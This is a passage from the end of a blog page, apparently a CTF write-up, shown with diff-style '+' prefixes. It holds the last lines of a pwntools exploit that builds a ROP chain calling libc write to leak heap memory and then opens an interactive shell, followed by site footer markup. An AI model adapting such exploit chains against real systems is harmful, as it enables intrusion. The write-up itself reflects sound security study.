+</span></span><span style=display:flex><span>payload <span style=color:#666>+=</span> p64(pop_rdi_ret) <span style=color:#666>+</span> p64(<span style=color:#40a070>0</span>) <span style=color:#666>+</span> p64(pop_rsi_ret) <span style=color:#666>+</span> p64(heap_base) <span style=color:#666>+</span> p64(pop_rdx_ret) <span style=color:#666>+</span> p64(<span style=color:#40a070>0x100</span>) <span style=color:#666>+</span> p64(libc_base <span style=color:#666>+</span> libc<span style=color:#666>.</span>symbols[<span style=color:#4070a0>&#34;write&#34;</span>])
+</span></span><span style=display:flex><span>debut(payload<span style=color:#666>.</span>ljust(<span style=color:#40a070>0x100</span>,<span style=color:#4070a0>&#39;a&#39;</span>),<span style=color:#40a070>0</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>interactive()
+</span></span></code></pre></div></section><div class=post-tags><nav class="nav tags"><ul class=tags><li><a href=/tags/write-up>write-up</a></li></ul></nav></div></article></main><footer><div style=display:flex><a class=soc href=https://github.com/chujDK rel=me title=GitHub><i data-feather=github></i></a>
+<a class=border></a></div><div class=footer-info>2023 <a href=https://github.com/athul/archie>Archie Theme</a> | Built with <a href=https://gohugo.io>Hugo</a></div></footer><script>feather.replace()</script></div></body></html>
